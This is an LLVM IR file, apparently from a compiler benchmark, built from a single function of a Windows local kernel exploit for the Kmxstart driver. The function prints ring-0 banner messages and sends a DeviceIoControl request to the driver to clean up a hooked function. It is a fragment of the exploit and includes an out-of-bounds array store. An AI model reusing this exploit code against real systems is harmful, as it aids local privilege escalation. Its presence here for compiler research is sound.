; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_29070.c_Ring0Function.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_29070.c_Ring0Function.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"-----[RING0]------\00", align 1
@.str.2 = private unnamed_addr constant [42 x i8] c"[*] Message: [.oO Hello From Ring0! Oo.]\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[!] Cleaning up Hooked Function\0A\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"\\\\.\\Kmxstart\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"[!] Exploit Terminated\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @Ring0Function() #0 {
  %1 = alloca [6 x i64], align 16
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %5 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %6 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %7 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  %8 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %9 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 0
  store i64 0, i64* %9, align 16
  %10 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 1
  store i64 0, i64* %10, align 8
  %11 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 2
  store i64 0, i64* %11, align 16
  %12 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 3
  store i64 0, i64* %12, align 8
  %13 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 4
  store i64 0, i64* %13, align 16
  %14 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 5
  store i64 0, i64* %14, align 8
  %15 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 6
  store i64 0, i64* %15, align 16
  %16 = call i32 @CreateFile(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i32 0, i32 0, i32* null, i32 3, i32 0, i32 0)
  store i32 %16, i32* %3, align 4
  %17 = load i32, i32* %3, align 4
  %18 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 0
  %19 = ptrtoint i64* %18 to i32
  %20 = getelementptr inbounds [6 x i64], [6 x i64]* %1, i64 0, i64 0
  %21 = ptrtoint i64* %20 to i32
  %22 = call i32 @DeviceIoControl(i32 %17, i32 -2063597564, i32 %19, i32 24, i32 %21, i32 68, i64* %2, i32* null)
  %23 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %24 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32) #1

declare dso_local i32 @DeviceIoControl(i32, i32, i32, i32, i32, i32, i64*, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
